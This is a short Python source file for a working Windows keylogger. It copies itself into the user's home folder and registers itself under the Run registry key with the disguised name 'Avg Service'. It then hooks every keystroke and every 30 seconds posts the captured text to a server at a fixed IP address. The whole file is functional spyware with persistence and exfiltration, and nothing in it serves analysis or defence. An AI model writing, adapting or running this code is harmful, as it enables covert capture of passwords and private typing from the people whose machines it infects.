import pythoncom,pyHook
import os
import shutil
import _winreg
import requests
import time

string = ''
now = time.time()


#Trying to make the keylogger persistent
try:

    #Copying the keylogger into current user home directory
    loc = os.path.join(os.path.expanduser('~'),__file__)
    if not os.path.exists(loc):
        shutil.copy(__file__,loc)

    #Adding the copied files path to windows registry
    key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',0,_winreg.KEY_ALL_ACCESS)
    _winreg.SetValueEx(key,'Avg Service',0,_winreg.REG_SZ,loc)
    key.Close()

except:
    string = 'Could not make it persistent\n'
    

def keypressed(event):
    global string
    global now
    if event.Ascii==13:
        string+= '<Enter>'
    elif event.Ascii==8:
        string += '<Backspace>'
    else:
        string += chr(event.Ascii)

    if (time.time()-now)>=30:
        now=time.time()
        try:
            #send recorded keystrokes to the server
            requests.post('http://192.168.145.1',data=string)
            string = ''
        except:
            pass
    return True 

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()

